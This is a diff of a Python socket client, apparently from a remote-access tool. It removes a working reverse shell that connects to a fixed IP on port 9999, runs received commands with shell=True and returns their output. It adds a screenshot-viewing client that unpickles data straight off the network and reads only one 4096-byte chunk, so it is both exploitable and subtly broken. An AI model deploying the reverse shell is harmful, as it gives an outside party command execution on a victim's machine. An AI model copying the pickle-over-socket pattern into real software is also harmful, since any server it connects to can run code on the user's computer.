@@ -1,23 +1,29 @@
 import socket
-import os
-import subprocess
+import pickle
+import zlib
+from PIL import Image
+import io
 
+def main():
+    server_ip = input("Enter server IP: ")
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect((server_ip, 9999))
 
-s = socket.socket()
-host = "192.168.47.72"
-port = 9999
+    try:
+        while True:
+            # Receive compressed screenshot data from the server
+            compressed_data = client_socket.recv(4096)
+            
+            # Decompress the data
+            screenshot_data = zlib.decompress(compressed_data)
+            
+            # Deserialize the data
+            screenshot = pickle.loads(screenshot_data)
+            
+            # Display the screenshot
+            screenshot.show()
+    finally:
+        client_socket.close()
 
-s.connect((host,     port))
-
-while True:
-    data = s.recv(1024)
-    if data[:2].decode("utf-8") == 'cd':
-        os.chdir(data[3:].decode("utf-8"))
-    
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte, "utf-8")
-        currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str + currentWD))
-    
+if __name__ == "__main__":
+    main()
